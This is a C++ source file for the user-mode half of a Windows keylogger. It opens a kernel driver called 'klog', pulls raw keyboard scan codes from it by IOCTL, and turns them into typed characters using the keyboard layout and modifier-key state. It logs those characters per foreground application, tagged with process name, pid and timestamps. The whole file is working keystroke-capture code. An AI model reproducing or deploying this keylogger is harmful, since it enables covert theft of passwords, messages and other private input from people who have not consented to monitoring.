#include "KbInputDataProcessor.h"

#include <psapi.h>
#include <iostream>
#include <iomanip>
#include <format>

KbInputDataProcessor::KbInputDataProcessor(std::wostream& out)
    : out{out}
{
    if (!setupHardwareDeviceInfo()) {
        return;
    }

    deviceInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    if (!findKlogDeviceInterface()) {
        return;
    }

    if (!connectToKlogDriver()) {
        return;
    }

    isAllSetup = true;
}

KbInputDataProcessor::~KbInputDataProcessor()
{
    if (device) {
        CloseHandle(device);
    }
    if (hardwareDeviceInfo) {
        SetupDiDestroyDeviceInfoList(hardwareDeviceInfo);
    }
    if (deviceInterfaceDetailData) {
        std::free(deviceInterfaceDetailData);
    }
    if (inputDataAddedEvent) {
        ResetEvent(inputDataAddedEvent);
        CloseHandle(inputDataAddedEvent);
    }
}

bool KbInputDataProcessor::isSetup() const
{
    return isAllSetup;
}

void KbInputDataProcessor::start()
{
    if (!isAllSetup) {
        std::cerr << "Failed to start processing keyboard input data. KbInputDataProcessor is not setup";
        return;
    }

    while (true) {
        DWORD waitResult = WaitForSingleObject(inputDataAddedEvent, INFINITE);

        if (waitResult == WAIT_OBJECT_0) {
            if (!DeviceIoControl(device, IOCTL_KLOG_GET_INPUT_DATA, NULL, 0,
                                 inpData, sizeof(inpData), &bytesReturned, NULL)) {
                ResetEvent(inputDataAddedEvent);
                std::cerr << std::format("DeviceIoControl with IOCTL_KLOG_GET_INPUT_DATA failed. "
                                         "Error code {:#X}\n", GetLastError());
                return;
            }
        }
        else {
            std::cerr << std::format("WaitForSingleObject failed. Error code {:#X}\n",
                                     GetLastError());
            break;
        }

        ResetEvent(inputDataAddedEvent);

        if (bytesReturned > 0) {
            printInputData();
        }

        bytesReturned = 0;
    }
}

bool KbInputDataProcessor::setupHardwareDeviceInfo()
{
    hardwareDeviceInfo = SetupDiGetClassDevsW((LPGUID) &GUID_DEVINTERFACE_KLOG, NULL, NULL,
                                              (DIGCF_PRESENT | DIGCF_DEVICEINTERFACE));
    if (hardwareDeviceInfo == INVALID_HANDLE_VALUE) {
        std::cerr << std::format("SetupDiGetClassDevs failed. Error code {:#X}\n",
                                 GetLastError());
        return false;
    }

    return true;
}

bool KbInputDataProcessor::findKlogDeviceInterface()
{
    if (!SetupDiEnumDeviceInterfaces(hardwareDeviceInfo, NULL,
                                     (LPGUID) &GUID_DEVINTERFACE_KLOG, 0, &deviceInterfaceData)) {
        std::cerr << std::format("SetupDiEnumDeviceInterfaces failed. Error code {:#X}\n",
                                 GetLastError());
        return false;
    }

    if (!SetupDiGetDeviceInterfaceDetailW(hardwareDeviceInfo, &deviceInterfaceData,
                                         NULL, 0, &requiredLength, NULL)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            std::cerr << std::format("SetupDiGetDeviceInterfaceDetail failed when retrieving "
                                     "device interface data. Error code {:#X}\n",
                                     GetLastError());
            return false;
        }
    }

    predictedLength = requiredLength;
    deviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA) std::malloc(predictedLength);
    if (deviceInterfaceDetailData) {
        deviceInterfaceDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);
    }
    else {
        std::cerr << "Unable to allocate " << predictedLength << " bytes for device interface details.\n";
        return false;
    }

    if (!SetupDiGetDeviceInterfaceDetailW(hardwareDeviceInfo, &deviceInterfaceData,
                                         deviceInterfaceDetailData,
                                         predictedLength, &requiredLength, NULL)) {
        std::cerr << std::format("SetupDiGetDeviceInterfaceDetail failed when retrieving "
                                 "device interface detail data. Error code {:#X}\n",
                                 GetLastError());
        return false;
    }

    return true;
}

bool KbInputDataProcessor::connectToKlogDriver()
{
    if (!deviceInterfaceDetailData) {
        std::cout << "No device interfaces present\n";
        return false;
    }

    device = CreateFileW(deviceInterfaceDetailData->DevicePath, GENERIC_READ | GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        std::cerr << std::format("Failed to open driver via device path. Error code {:#X}\n",
                                 GetLastError());
        return false;
    }

    if (!DeviceIoControl(device, IOCTL_KLOG_INIT, NULL, 0,
                         &inpData, sizeof(inpData), &bytesReturned, NULL)) {
        std::cerr << std::format("Initialization of klog failed. Error code {:#X}\n",
                                 GetLastError());
        return false;
    }

    inputDataAddedEvent = OpenEventW(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, UM_NOTIF_EVENT_NAME);
    if (!inputDataAddedEvent) {
        std::cerr << std::format("Failed to open KeyboardInputDataAddedEvent. Error code {:#X}\n",
                                 GetLastError());
        return false;
    }

    return true;
}

void KbInputDataProcessor::printInputData()
{
    DWORD processId = getForegroundWindowThreadProcessId();
    if (processId == 0) {
        std::cerr << std::format("Failed to retrieve process id. Error code {:#X}\n",
                                 GetLastError());
        return;
    }
    
    if (currentProcessId != processId) {
        printFooter();
        currentProcessId = processId;
        printHeader();
    }

    HKL currentKeyboardLayout = GetKeyboardLayout(currentThreadId);

    for (ULONG i = 0; i < (bytesReturned / sizeof(inpData[0])); ++i) {
        // Ignore fake shift
        if ((inpData[i].Flags & KEY_E0) && inpData[i].MakeCode == 0x2A) {
            continue;
        }
        
        determineKeboardState(inpData[i]);
        if (inpData[i].Flags == KEY_MAKE) {         // Process only key press
            out << kbMakeCodeConverted.convertToCharacter(inpData[i].MakeCode, currentKeyboardLayout,
                                                          isShiftPressed, isCapsLockEnabled, isNumLockEnabled) 
                << L" ";
        }
        else if (inpData[i].Flags == KEY_E0) {      // Process extended key press (0xE0XX keys)
            out << kbMakeCodeConverted.convertToCharacter(inpData[i].MakeCode | 0xE000, currentKeyboardLayout,
                                                          isShiftPressed, isCapsLockEnabled, isNumLockEnabled) 
                << L" ";
        }
    }
}

DWORD KbInputDataProcessor::getForegroundWindowThreadProcessId()
{
    HWND    foregroundWindow = GetForegroundWindow();
    DWORD   processId = 0;

    currentThreadId = GetWindowThreadProcessId(foregroundWindow, &processId);

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!processHandle) {
        std::cerr << std::format("Failed to open process with id {}. Error code {:#X}\n",
                                 processId, GetLastError());
        return processId;
    }

    if (!GetModuleBaseNameW(processHandle, nullptr, processName, MAX_PATH)) {
        std::cerr << std::format("Failed to retrieve name of process with id {}. Error code {:#X}\n",
                                 processId, GetLastError());
        CloseHandle(processHandle);
        return processId;
    }

    CloseHandle(processHandle);

    return processId;
}

void KbInputDataProcessor::printHeader()
{
    std::time_t now = std::time(nullptr);
    std::tm local_time;
    localtime_s(&local_time, &now);
    auto timeFormatted = std::put_time(&local_time, L"%Y-%m-%d %H:%M:%S");

    out << L"\[" << processName << ", pid " << currentProcessId << L", Started "
        << timeFormatted << L"]\n";
}

void KbInputDataProcessor::printFooter()
{
    static bool isFirstLine = true;

    if (isFirstLine) {
        isFirstLine = false;
        return;
    }

    std::time_t now = std::time(nullptr);
    std::tm local_time;
    localtime_s(&local_time, &now);
    auto timeFormatted = std::put_time(&local_time, L"%Y-%m-%d %H:%M:%S");

    out << L"\n[" << "Ended " << timeFormatted << L"]\n\n";
}

void KbInputDataProcessor::determineKeboardState(KEYBOARD_INPUT_DATA inpData)
{
    if (inpData.MakeCode == Key::LShift || inpData.MakeCode == Key::RShift) {
        if (inpData.Flags == KEY_MAKE) {
            isShiftPressed = true;
        }
        else if (inpData.Flags == KEY_BREAK) {
            isShiftPressed = false;
        }
    }

    if (inpData.MakeCode == Key::CapsLock && inpData.Flags == KEY_MAKE) {
        isCapsLockEnabled = !isCapsLockEnabled;
    }

    if (inpData.MakeCode == Key::NumLock && inpData.Flags == KEY_MAKE) {
        isNumLockEnabled = !isNumLockEnabled;
    }
}
